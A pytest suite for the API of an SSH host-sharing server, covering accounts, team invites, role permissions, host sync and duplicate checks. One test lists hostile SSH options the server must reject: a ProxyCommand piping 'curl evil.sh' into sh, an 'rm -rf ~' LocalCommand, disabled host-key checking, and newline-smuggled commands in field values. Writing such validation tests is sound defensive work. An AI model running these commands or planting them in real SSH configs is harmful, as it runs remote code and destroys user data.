"""API tests: accounts, teams, invites, shared hosts, sync and permissions."""

from __future__ import annotations

from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from sshdesk_server.config import Settings
from sshdesk_server.main import create_app


@pytest.fixture
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> TestClient:
    for var in ("SMTP_HOST", "DATABASE_URL", "SECRET_KEY"):
        monkeypatch.delenv(var, raising=False)
    settings = Settings(data_dir=tmp_path, database_url=f"sqlite:///{tmp_path}/t.db", secret_key="t" * 40)
    return TestClient(create_app(settings))


def register(client: TestClient, email: str, password: str = "correct horse 1", name: str = "") -> dict:
    r = client.post("/api/v1/auth/register", json={"email": email, "password": password, "name": name})
    assert r.status_code == 201, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


HOST = {"alias": "painel", "hostname": "192.168.10.20", "user": "deploy", "port": 22,
        "identity_file": "~/.ssh/id_ed25519", "group": "Produção",
        "options": [["ServerAliveInterval", "60"]],
        "host_keys": ["ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"]}


def test_register_login_me(client: TestClient) -> None:
    headers = register(client, "Lucas@Example.com", name="Lucas")
    assert client.get("/api/v1/auth/me", headers=headers).json()["email"] == "lucas@example.com"
    assert client.post("/api/v1/auth/register", json={"email": "lucas@example.com", "password": "another pass"}).status_code == 409
    r = client.post("/api/v1/auth/login", json={"email": "LUCAS@example.com", "password": "correct horse 1"})
    assert r.status_code == 200 and r.json()["user"]["name"] == "Lucas"
    assert client.post("/api/v1/auth/login", json={"email": "lucas@example.com", "password": "wrong"}).status_code == 401
    assert client.post("/api/v1/auth/login", json={"email": "nobody@example.com", "password": "x"}).status_code == 401
    assert client.get("/api/v1/auth/me").status_code == 401
    assert client.get("/api/v1/auth/me", headers={"Authorization": "Bearer garbage"}).status_code == 401


def test_short_password_rejected(client: TestClient) -> None:
    assert client.post("/api/v1/auth/register", json={"email": "a@b.com", "password": "short"}).status_code == 422


def test_password_change_revokes_old_tokens(client: TestClient) -> None:
    old = register(client, "a@example.com")
    r = client.post("/api/v1/auth/password", headers=old, json={"current_password": "correct horse 1", "new_password": "new password 2"})
    assert r.status_code == 200
    assert client.get("/api/v1/auth/me", headers=old).status_code == 401
    new = {"Authorization": f"Bearer {r.json()['access_token']}"}
    assert client.get("/api/v1/auth/me", headers=new).status_code == 200


def test_full_team_invite_flow(client: TestClient) -> None:
    owner = register(client, "owner@example.com")
    team = client.post("/api/v1/teams", headers=owner, json={"name": "Infra OPA"}).json()
    assert team["role"] == "owner" and team["slug"] == "infra-opa"
    tid = team["id"]

    host = client.post(f"/api/v1/teams/{tid}/hosts", headers=owner, json=HOST)
    assert host.status_code == 201, host.text

    inv = client.post(f"/api/v1/teams/{tid}/invites", headers=owner, json={"email": "dev@example.com"}).json()
    code = inv["code"]
    assert code and inv["email_sent"] is False  # no SMTP configured -> share code manually

    dev = register(client, "dev@example.com")
    pending = client.get("/api/v1/invites", headers=dev).json()
    assert [p["team_name"] for p in pending] == ["Infra OPA"] and pending[0]["code"] is None

    # other people cannot use the code
    intruder = register(client, "intruder@example.com")
    assert client.post("/api/v1/invites/accept", headers=intruder, json={"code": code}).status_code == 403

    joined = client.post("/api/v1/invites/accept", headers=dev, json={"code": code.lower().replace("-", " ")})
    assert joined.status_code == 200 and joined.json()["role"] == "member"
    assert client.post("/api/v1/invites/accept", headers=dev, json={"code": code}).status_code == 400  # single use

    sync = client.get("/api/v1/sync", headers=dev)
    data = sync.json()
    assert sync.headers["etag"]
    assert data["teams"][0]["hosts"][0]["alias"] == "painel"
    assert data["teams"][0]["hosts"][0]["host_keys"] == HOST["host_keys"]
    assert client.get("/api/v1/sync", headers=intruder).json()["teams"] == []
    assert client.get("/api/v1/sync", headers={**dev, "If-None-Match": sync.headers["etag"]}).status_code == 304

    # members can read but not change hosts
    hid = data["teams"][0]["hosts"][0]["id"]
    assert client.put(f"/api/v1/teams/{tid}/hosts/{hid}", headers=dev, json=HOST).status_code == 403
    assert client.post(f"/api/v1/teams/{tid}/invites", headers=dev, json={"email": "x@example.com"}).status_code == 403
    # non-members do not even see the team
    assert client.get(f"/api/v1/teams/{tid}/hosts", headers=intruder).status_code == 404

    # revision bumps on change -> ETag changes
    before = sync.headers["etag"]
    upd = dict(HOST, port=2222)
    assert client.put(f"/api/v1/teams/{tid}/hosts/{hid}", headers=owner, json=upd).json()["port"] == 2222
    assert client.get("/api/v1/sync", headers=dev).headers["etag"] != before

    members = client.get(f"/api/v1/teams/{tid}/members", headers=dev).json()
    assert {m["email"]: m["role"] for m in members} == {"owner@example.com": "owner", "dev@example.com": "member"}


def test_invite_expired_and_revoked(client: TestClient) -> None:
    owner = register(client, "o@example.com")
    tid = client.post("/api/v1/teams", headers=owner, json={"name": "T"}).json()["id"]
    inv = client.post(f"/api/v1/teams/{tid}/invites", headers=owner, json={"email": "m@example.com"}).json()
    assert client.delete(f"/api/v1/teams/{tid}/invites/{inv['id']}", headers=owner).status_code == 204
    member = register(client, "m@example.com")
    assert client.post("/api/v1/invites/accept", headers=member, json={"code": inv["code"]}).status_code == 400


def test_dangerous_options_rejected(client: TestClient) -> None:
    owner = register(client, "o@example.com")
    tid = client.post("/api/v1/teams", headers=owner, json={"name": "T"}).json()["id"]
    for bad in (
        dict(HOST, options=[["ProxyCommand", "curl evil.sh | sh"]]),
        dict(HOST, options=[["LocalCommand", "rm -rf ~"]]),
        dict(HOST, options=[["StrictHostKeyChecking", "no"]]),
        dict(HOST, options=[["ServerAliveInterval", "60\nProxyCommand evil"]]),
        dict(HOST, alias="*"),
        dict(HOST, hostname="evil host"),
        dict(HOST, identity_file='~/.ssh/x"\nProxyCommand y'),
        dict(HOST, host_keys=["not a key"]),
    ):
        assert client.post(f"/api/v1/teams/{tid}/hosts", headers=owner, json=bad).status_code == 422, bad


def test_roles_and_last_owner(client: TestClient) -> None:
    owner = register(client, "o@example.com")
    tid = client.post("/api/v1/teams", headers=owner, json={"name": "T"}).json()["id"]
    me = client.get("/api/v1/auth/me", headers=owner).json()["id"]
    assert client.delete(f"/api/v1/teams/{tid}/members/{me}", headers=owner).status_code == 400
    inv = client.post(f"/api/v1/teams/{tid}/invites", headers=owner, json={"email": "a@example.com", "role": "admin"}).json()
    admin = register(client, "a@example.com")
    client.post("/api/v1/invites/accept", headers=admin, json={"code": inv["code"]})
    assert client.post(f"/api/v1/teams/{tid}/hosts", headers=admin, json=HOST).status_code == 201  # admin can edit
    assert client.post(f"/api/v1/teams/{tid}/hosts", headers=admin, json=HOST).status_code == 409  # duplicate alias
    assert client.delete(f"/api/v1/teams/{tid}", headers=admin).status_code == 403  # only owner deletes
    admin_id = client.get("/api/v1/auth/me", headers=admin).json()["id"]
    assert client.delete(f"/api/v1/teams/{tid}/members/{admin_id}", headers=admin).status_code == 204  # leave
    assert client.get("/api/v1/teams", headers=admin).json() == []


def test_registration_can_be_disabled(tmp_path: Path) -> None:
    settings = Settings(data_dir=tmp_path, database_url=f"sqlite:///{tmp_path}/t.db", secret_key="s" * 40, allow_registration=False)
    c = TestClient(create_app(settings))
    assert c.post("/api/v1/auth/register", json={"email": "a@b.com", "password": "password123"}).status_code == 403
    assert c.get("/api/v1/info").json()["registration"] is False


def test_login_rate_limited(client: TestClient) -> None:
    register(client, "r@example.com")
    codes = [client.post("/api/v1/auth/login", json={"email": "r@example.com", "password": "bad"}).status_code for _ in range(12)]
    assert codes[-1] == 429


def test_invite_email_sent(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    sent = []

    class FakeSMTP:
        def __init__(self, host, port, timeout=None):
            sent.append(("connect", host, port))

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def starttls(self, context=None):
            sent.append("tls")

        def login(self, u, p):
            sent.append(("login", u))

        def send_message(self, msg):
            sent.append(("to", msg["To"], msg.get_content()))

    monkeypatch.setattr("smtplib.SMTP", FakeSMTP)
    settings = Settings(data_dir=tmp_path, database_url=f"sqlite:///{tmp_path}/t.db", secret_key="s" * 40,
                        smtp_host="smtp.example.com", smtp_user="bot", smtp_password="pw")
    c = TestClient(create_app(settings))
    owner = register(c, "o@example.com")
    tid = c.post("/api/v1/teams", headers=owner, json={"name": "Infra"}).json()["id"]
    inv = c.post(f"/api/v1/teams/{tid}/invites", headers=owner, json={"email": "new@example.com"}).json()
    assert inv["email_sent"] is True
    to = [s for s in sent if isinstance(s, tuple) and s[0] == "to"][0]
    assert to[1] == "new@example.com" and inv["code"] in to[2]


def test_team_never_holds_the_same_host_twice(client: TestClient) -> None:
    owner = register(client, "owner@example.com")
    team = client.post("/api/v1/teams", headers=owner, json={"name": "Infra"}).json()
    url = f"/api/v1/teams/{team['id']}/hosts"
    first = client.post(url, headers=owner, json=HOST)
    assert first.status_code == 201, first.text
    # same name with other case
    r = client.post(url, headers=owner, json={**HOST, "alias": "PAINEL", "hostname": "10.9.9.9"})
    assert r.status_code == 409 and "already exists" in r.json()["detail"]
    # same server under another name (user unset counts as the same login)
    r = client.post(url, headers=owner, json={**HOST, "alias": "painel-2", "user": ""})
    assert r.status_code == 409 and "already in the team as 'painel'" in r.json()["detail"]
    # different user, port or bastion = a different host
    assert client.post(url, headers=owner, json={**HOST, "alias": "painel-root", "user": "root"}).status_code == 201
    assert client.post(url, headers=owner, json={**HOST, "alias": "painel-2222", "port": 2222}).status_code == 201
    other = client.post(url, headers=owner, json={**HOST, "alias": "painel-dmz", "proxy_jump": "bastion"})
    assert other.status_code == 201
    # updating one host into a copy of another is refused; updating itself is fine
    r = client.put(f"{url}/{other.json()['id']}", headers=owner, json={**HOST, "alias": "painel-dmz"})
    assert r.status_code == 409
    assert client.put(f"{url}/{first.json()['id']}", headers=owner, json={**HOST, "group": "HML"}).status_code == 200
